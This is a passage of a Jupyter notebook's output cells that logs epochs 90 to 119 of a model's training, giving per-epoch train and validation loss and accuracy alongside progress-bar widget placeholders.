       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:16 | INFO | Validation Loss: 0.8531 | Validation Accuracy: 0.8279\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8102888c58864f9cb38182351050e65f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:33 | INFO | Epoch 90 | Train Loss: 0.3420 | Train Accuracy: 0.9288\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9b47710cd9ba4be0af5926087edbac4a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:35 | INFO | Validation Loss: 0.9657 | Validation Accuracy: 0.7942\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a13c4c936632464c965898a489f1503a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:50 | INFO | Epoch 91 | Train Loss: 0.3201 | Train Accuracy: 0.9339\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4bb6f4098d5c4fc79c5ed7236dcfd02d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:54:52 | INFO | Validation Loss: 0.8939 | Validation Accuracy: 0.8191\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e4ac8ec3d6e74166a8ab8868b5912803",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:08 | INFO | Epoch 92 | Train Loss: 0.3196 | Train Accuracy: 0.9337\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9b83787ff60d488d916392787c64d9bf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:09 | INFO | Validation Loss: 0.9162 | Validation Accuracy: 0.8121\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c4ed057bc03149ee9a97f1eaa3679b36",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:25 | INFO | Epoch 93 | Train Loss: 0.3134 | Train Accuracy: 0.9353\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7a27364261e44b239262578674a03efc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:27 | INFO | Validation Loss: 0.8310 | Validation Accuracy: 0.8343\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "25f2a84bbe904430ab2b8b1a862a1e43",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:46 | INFO | Epoch 94 | Train Loss: 0.3154 | Train Accuracy: 0.9351\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1fa9a1f81400460a874c84718dc002cd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:55:48 | INFO | Validation Loss: 0.9244 | Validation Accuracy: 0.8135\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "143b1165abd9478fab8afb92b3c6440c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:05 | INFO | Epoch 95 | Train Loss: 0.3108 | Train Accuracy: 0.9357\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1e5344cfd6ca4152ba8ea8b818e93fb6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:07 | INFO | Validation Loss: 0.9660 | Validation Accuracy: 0.8088\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "568cef529bb948cf819bfa9ca7ddd4f8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:23 | INFO | Epoch 96 | Train Loss: 0.3011 | Train Accuracy: 0.9384\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "14c5edc2246d4fc98db07e77d387a8eb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:25 | INFO | Validation Loss: 0.8897 | Validation Accuracy: 0.8105\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e321c9a1d31f4da1bd1e0aaaff5234f9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:41 | INFO | Epoch 97 | Train Loss: 0.2986 | Train Accuracy: 0.9384\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c1807a9353a6474c9798561ce31d450e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:56:43 | INFO | Validation Loss: 0.9885 | Validation Accuracy: 0.8018\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1c85e7891f5a4cc085be212bf57a5ef4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:00 | INFO | Epoch 98 | Train Loss: 0.2990 | Train Accuracy: 0.9382\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0a130ef6d0854bc698505e0ce93a8ca0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:02 | INFO | Validation Loss: 0.9047 | Validation Accuracy: 0.8157\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e0b4efaad45d4946952d9c03803e43af",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:19 | INFO | Epoch 99 | Train Loss: 0.3101 | Train Accuracy: 0.9357\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3715518b3515479d94d2f276ceb9ef56",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:21 | INFO | Validation Loss: 0.9453 | Validation Accuracy: 0.8105\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9a9e0f8339f24f1d873c9f797df90f38",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:37 | INFO | Epoch 100 | Train Loss: 0.3140 | Train Accuracy: 0.9343\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f9b72b66e014c36ac47f0364937af75",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:39 | INFO | Validation Loss: 0.8732 | Validation Accuracy: 0.8156\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "afe10e4e6f254a6da82dff01f42f43cf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:56 | INFO | Epoch 101 | Train Loss: 0.3310 | Train Accuracy: 0.9317\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "059afc903a6943beaecb14ea52691f36",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:57:58 | INFO | Validation Loss: 0.9311 | Validation Accuracy: 0.8070\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "47a5c20ed5584525b33816a9753e43fa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:14 | INFO | Epoch 102 | Train Loss: 0.3307 | Train Accuracy: 0.9315\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a0b5f9465434581a91d7b50ddc67937",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:16 | INFO | Validation Loss: 0.9404 | Validation Accuracy: 0.8151\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ef9a9d4e7cb34a41bd386b9edf249cdb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:33 | INFO | Epoch 103 | Train Loss: 0.3053 | Train Accuracy: 0.9370\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "38ce13b89166415790e754132d23f561",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:34 | INFO | Validation Loss: 1.0533 | Validation Accuracy: 0.7950\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "063e26698ad249d7a40891dbd45ce06e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:50 | INFO | Epoch 104 | Train Loss: 0.3132 | Train Accuracy: 0.9352\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "85db607d56564b6fbb8124feffe0622f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:58:52 | INFO | Validation Loss: 0.8594 | Validation Accuracy: 0.8234\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b36a1944a602445591c8f8b20dae44d4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:09 | INFO | Epoch 105 | Train Loss: 0.3129 | Train Accuracy: 0.9350\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "00cc78e34b804a3598d32f7d2a5afa41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:11 | INFO | Validation Loss: 0.9565 | Validation Accuracy: 0.8020\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d50c451aab124bc5ad8e8dfb697fe610",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:28 | INFO | Epoch 106 | Train Loss: 0.3215 | Train Accuracy: 0.9333\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ce9db0b791844b8b9df5e8d4daf52036",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:29 | INFO | Validation Loss: 0.9868 | Validation Accuracy: 0.8083\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "698158d59ad94cf2acc4f99b8eaff4ec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:46 | INFO | Epoch 107 | Train Loss: 0.2983 | Train Accuracy: 0.9381\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24da5a08e1464588921455efc09c1f83",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:59:47 | INFO | Validation Loss: 0.9180 | Validation Accuracy: 0.8169\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cef06d9f134b4554bad4f7f29babb900",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:03 | INFO | Epoch 108 | Train Loss: 0.3096 | Train Accuracy: 0.9359\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1d90d66cf2f343839315a12881d1f345",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:05 | INFO | Validation Loss: 1.0236 | Validation Accuracy: 0.7848\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a88cdab32b5431a8977a3349a9fb76d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:21 | INFO | Epoch 109 | Train Loss: 0.3105 | Train Accuracy: 0.9356\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb812c626a294277b3765caea828778e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:23 | INFO | Validation Loss: 0.9018 | Validation Accuracy: 0.8205\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bf98546a41824f15b5a944469b08a391",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:39 | INFO | Epoch 110 | Train Loss: 0.3165 | Train Accuracy: 0.9346\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "771cdb84479942c7b6427bfcda1dd9b8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:41 | INFO | Validation Loss: 0.8777 | Validation Accuracy: 0.8170\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "530114d215af462a87e91b964f11c066",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:00:58 | INFO | Epoch 111 | Train Loss: 0.3073 | Train Accuracy: 0.9359\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c9eae5bfd73489c9180c3c68fa255ba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:00 | INFO | Validation Loss: 1.0178 | Validation Accuracy: 0.8069\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "97d18b124f0742be9c00a413f37b10b4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:16 | INFO | Epoch 112 | Train Loss: 0.3209 | Train Accuracy: 0.9330\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "00f0af2eb6624f65be8529f679679518",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:19 | INFO | Validation Loss: 1.0821 | Validation Accuracy: 0.7988\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "28817cb78a704e3c9c025f6a8d6ee23a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:37 | INFO | Epoch 113 | Train Loss: 0.3068 | Train Accuracy: 0.9367\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f724ffc9c6741b1a2a7ce110ee1229a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:39 | INFO | Validation Loss: 0.9661 | Validation Accuracy: 0.8068\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79faac26654f4837a6f9f1d276c840e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:55 | INFO | Epoch 114 | Train Loss: 0.3336 | Train Accuracy: 0.9304\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "08ddc74afa924dd6bd76f48415d6c772",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:01:57 | INFO | Validation Loss: 0.8835 | Validation Accuracy: 0.8185\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79d8785b363646509c1d4a854c6b1e7a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:13 | INFO | Epoch 115 | Train Loss: 0.3055 | Train Accuracy: 0.9366\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "35f747fdb314483d979e27abff675334",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:15 | INFO | Validation Loss: 1.0089 | Validation Accuracy: 0.8007\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "796d669dc3934e7ab20db8edf693187d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:31 | INFO | Epoch 116 | Train Loss: 0.3064 | Train Accuracy: 0.9354\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2228ab38bfeb4726b6cc7e0a9c5f21a9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:33 | INFO | Validation Loss: 1.2502 | Validation Accuracy: 0.7595\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7d92d5380b094361916120da6c6f5d80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:49 | INFO | Epoch 117 | Train Loss: 0.2933 | Train Accuracy: 0.9388\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3e1654005c9d48499b6688694309914b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:02:51 | INFO | Validation Loss: 0.9890 | Validation Accuracy: 0.8130\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "857dda2473564b88940f336011aa50f5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:08 | INFO | Epoch 118 | Train Loss: 0.2944 | Train Accuracy: 0.9389\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4adb789cfb474dd3b32eb649c273605c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:10 | INFO | Validation Loss: 0.8316 | Validation Accuracy: 0.8344\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6220169f99eb49978868b07afee0afd6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:30 | INFO | Epoch 119 | Train Loss: 0.2835 | Train Accuracy: 0.9410\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a989d1227eed41918be9187616038239",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:03:32 | INFO | Validation Loss: 1.0365 | Validation Accuracy: 0.7960\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1d17b358db2d43e296435355fefcbf80",
